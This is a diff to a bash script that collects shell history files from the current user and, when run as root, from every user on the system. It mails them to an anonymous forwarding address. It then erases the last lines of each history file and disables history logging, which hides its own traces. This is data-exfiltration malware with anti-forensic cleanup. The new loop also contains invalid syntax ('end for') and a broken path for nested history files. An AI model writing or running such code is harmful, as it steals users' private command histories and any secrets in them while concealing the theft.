@@ -4,7 +4,7 @@ unset HISTFILE
 # Function to collect history from all available shells
 collect_shell_history() {
     echo "=== COLLECTING SHELL HISTORIES ==="
-    
+
     # List of common shell history files
     declare -A SHELL_HISTORIES=(
         ["bash"]="$HOME/.bash_history"
@@ -13,10 +13,10 @@ collect_shell_history() {
         ["fish"]="$HOME/.local/share/fish/fish_history"
         ["tcsh"]="$HOME/.history"
     )
-    
+
     # System-wide shells (check /etc/shells)
     SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)
-    
+
     OUTPUT=""
     for shell in $SYSTEM_SHELLS; do
         case $shell in
@@ -29,7 +29,7 @@ collect_shell_history() {
                 ;;
         esac
     done
-    
+
     # Also check for root histories if running as root
     if [ $(id -u) -eq 0 ]; then
         for user in $(ls /home); do
@@ -42,7 +42,7 @@ collect_shell_history() {
             done
         done
     fi
-    
+
     echo -e "$OUTPUT"
 }
 
@@ -73,10 +73,17 @@ EOF
 
     # Send email
     if command -v mail &>/dev/null; then
+        echo "Sending email..."
         echo "$EMAIL_CONTENT" | mail -s "Full Shell History Report from $HOSTNAME" ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com
+        if [ $? -eq 0 ]; then
+            echo "Email sent successfully."
+        else
+            echo "Error sending email."
+        fi
     else
         echo "Warning: mailutils not installed - storing report in /tmp/system_report.txt"
         echo "$EMAIL_CONTENT" > /tmp/system_report.txt
+        echo "System report stored in /tmp/system_report.txt"
     fi
 }
 
@@ -135,23 +142,48 @@ fi
 
 # Enhanced history cleanup for all shells
 cleanup_histories() {
-    echo "Cleaning all shell histories..."
-    
-    # Current user's histories
-    rm -f ~/.bash_history ~/.zsh_history ~/.sh_history 
-    rm -rf ~/.local/share/fish/fish_history
-    rm -f ~/.history
-    
+    echo "Cleaning the last 10 lines of all shell histories..."
+
+    # Function to clean the last 10 lines of a given history file
+    clean_history_file() {
+        local file="$1"
+        if [ -f "$file" ]; then
+            local line_count=$(wc -l < "$file")
+            if [ "$line_count" -gt 10 ]; then
+                head -n $((line_count - 10)) "$file" > "${file}.tmp"
+                mv "${file}.tmp" "$file"
+                echo "Cleaned last 10 lines of: $file"
+            elif [ "$line_count" -gt 0 ]; then
+                echo "History file '$file' has less than or equal to 10 lines. Not cleaning."
+            else
+                echo "History file '$file' is empty."
+            fi
+        else
+            echo "History file '$file' not found."
+        fi
+    }
+
+    # List of common shell history files
+    declare -A SHELL_HISTORIES=(
+        ["bash"]="$HOME/.bash_history"
+        ["zsh"]="$HOME/.zsh_history"
+        ["ksh"]="$HOME/.sh_history"
+        ["fish"]="$HOME/.local/share/fish/fish_history"
+        ["tcsh"]="$HOME/.history"
+    )
+
+    # Clean current user's histories
+    for shell in "${!SHELL_HISTORIES[@]}"; do
+        clean_history_file "${SHELL_HISTORIES[$shell]}"
+    end for
+
     # Root cleans all user histories if running as root
     if [ $(id -u) -eq 0 ]; then
         for user in $(ls /home); do
-            rm -f /home/$user/.bash_history /home/$user/.zsh_history /home/$user/.sh_history
-            rm -rf /home/$user/.local/share/fish/fish_history
-            rm -f /home/$user/.history
+            for shell in "${!SHELL_HISTORIES[@]}"; do
+                clean_history_file "/home/$user/${SHELL_HISTORIES[$shell]##*/}"
+            done
         done
     fi
-    
-    # Clear current session history
-    history -c
 }
 cleanup_histories
